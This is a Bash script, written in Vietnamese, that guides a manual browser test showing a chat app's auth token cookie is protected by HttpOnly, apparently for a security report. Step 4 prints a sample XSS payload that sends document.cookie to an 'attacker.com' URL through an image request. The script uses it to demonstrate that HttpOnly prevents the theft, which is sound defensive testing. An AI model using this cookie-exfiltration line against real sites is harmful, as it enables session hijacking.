#!/bin/bash

# Script Kiểm Thử Kịch Bản 2: HttpOnly Cookie Protection
# Hướng dẫn manual test vì cần browser interaction

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  KỊCH BẢN 2: HTTPONLY COOKIE${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

echo -e "${CYAN}Kịch bản này cần thực hiện manual trên trình duyệt.${NC}"
echo -e "${CYAN}Hãy làm theo các bước sau:${NC}"
echo ""

# Get VM1 IP
VM1_PUBLIC=$(gcloud compute instances describe chat-system-app \
  --zone=us-central1-c \
  --format="get(networkInterfaces[0].accessConfigs[0].natIP)" 2>/dev/null || echo "localhost")

echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}  BƯỚC 1: ĐĂNG NHẬP${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "1. Mở trình duyệt (Chrome/Firefox)"
echo -e "2. Truy cập: ${GREEN}http://$VM1_PUBLIC:8029/login${NC}"
echo -e "3. Đăng nhập với tài khoản test"
echo -e "4. Sau khi login thành công, chuyển sang Bước 2"
echo ""
read -p "Nhấn Enter khi đã đăng nhập xong..."

echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}  BƯỚC 2: KIỂM TRA COOKIE TRONG DEVTOOLS${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "1. Nhấn ${GREEN}F12${NC} để mở DevTools"
echo -e "2. Vào tab ${GREEN}Application${NC} (Chrome) hoặc ${GREEN}Storage${NC} (Firefox)"
echo -e "3. Expand ${GREEN}Cookies${NC} → Chọn domain của website"
echo -e "4. Tìm cookie có tên ${GREEN}'token'${NC} hoặc ${GREEN}'auth_token'${NC}"
echo -e "5. Kiểm tra cột ${GREEN}'HttpOnly'${NC} - Phải có dấu ${GREEN}✓${NC}"
echo ""
echo -e "${CYAN}📸 Chụp màn hình này cho báo cáo (Screenshot 1)${NC}"
echo ""
read -p "Nhấn Enter khi đã kiểm tra xong..."

echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}  BƯỚC 3: THỬ TRUY CẬP COOKIE QUA JAVASCRIPT${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "1. Vẫn trong DevTools, chuyển sang tab ${GREEN}Console${NC}"
echo -e "2. Gõ lệnh sau và nhấn Enter:"
echo -e ""
echo -e "   ${GREEN}document.cookie${NC}"
echo -e ""
echo -e "3. Kết quả mong đợi:"
echo -e "   • ${GREEN}KHÔNG${NC} thấy giá trị của ${GREEN}token${NC} trong output"
echo -e "   • Có thể thấy các cookie khác (không phải HttpOnly)"
echo -e "   • Hoặc output là chuỗi rỗng ${GREEN}\"\"${NC}"
echo ""
echo -e "${CYAN}📸 Chụp màn hình Console này (Screenshot 2)${NC}"
echo ""
read -p "Nhấn Enter khi đã test xong..."

echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}  BƯỚC 4: GIẢI THÍCH XSS ATTACK SCENARIO${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "1. Trong Console, thử chạy đoạn code tấn công XSS:"
echo -e ""
echo -e "${RED}// Malicious script trying to steal cookie${NC}"
echo -e "${RED}var img = new Image();${NC}"
echo -e "${RED}img.src = \"https://attacker.com/steal?cookie=\" + document.cookie;${NC}"
echo -e "${RED}document.body.appendChild(img);${NC}"
echo -e ""
echo -e "2. Mở tab ${GREEN}Network${NC}"
echo -e "3. Tìm request đến ${RED}attacker.com${NC}"
echo -e "4. Kiểm tra URL - ${GREEN}KHÔNG${NC} có token trong query string"
echo ""
echo -e "${GREEN}→ Kết luận: Token được bảo vệ bởi HttpOnly, XSS không thể đánh cắp!${NC}"
echo ""
echo -e "${CYAN}📸 Chụp màn hình Network tab (Screenshot 3)${NC}"
echo ""
read -p "Nhấn Enter để tiếp tục..."

echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}  BƯỚC 5: KIỂM TRA CODE IMPLEMENTATION${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "Kiểm tra file: ${GREEN}apps/frontend/app/api/proxy/login/route.js${NC}"
echo ""

if [ -f "apps/frontend/app/api/proxy/login/route.js" ]; then
    echo -e "${GREEN}✓${NC} File tồn tại. Hiển thị phần code quan trọng:"
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    grep -A 6 "cookies().set('token'" apps/frontend/app/api/proxy/login/route.js || \
    grep -A 6 "httpOnly: true" apps/frontend/app/api/proxy/login/route.js || \
    echo -e "${YELLOW}⚠ Không tìm thấy code snippet. Mở file thủ công để kiểm tra.${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${CYAN}📸 Chụp màn hình code này (Screenshot 4)${NC}"
else
    echo -e "${YELLOW}⚠ File không tìm thấy. Đảm bảo bạn đang ở thư mục gốc của project.${NC}"
fi

echo ""
read -p "Nhấn Enter khi đã kiểm tra code..."

# Summary
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  KẾT QUẢ KIỂM THỬ${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

echo -e "${GREEN}✅ Bước 1:${NC} Đăng nhập thành công"
echo -e "${GREEN}✅ Bước 2:${NC} Cookie có flag HttpOnly"
echo -e "${GREEN}✅ Bước 3:${NC} document.cookie không trả về token"
echo -e "${GREEN}✅ Bước 4:${NC} XSS attack không thể đánh cắp token"
echo -e "${GREEN}✅ Bước 5:${NC} Code implementation đúng"

echo ""
echo -e "${GREEN}🎉 KỊCH BẢN 2 - THÀNH CÔNG!${NC}"
echo -e "${GREEN}Lớp HttpOnly Cookie đã bảo vệ Token khỏi tấn công XSS.${NC}"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  CHECKLIST CHO BÁO CÁO:${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo "[ ] Screenshot 1: DevTools → Cookies với HttpOnly ✓"
echo "[ ] Screenshot 2: Console → document.cookie không có token"
echo "[ ] Screenshot 3: Network tab → XSS request không chứa token"
echo "[ ] Screenshot 4: Code với httpOnly: true"
echo ""
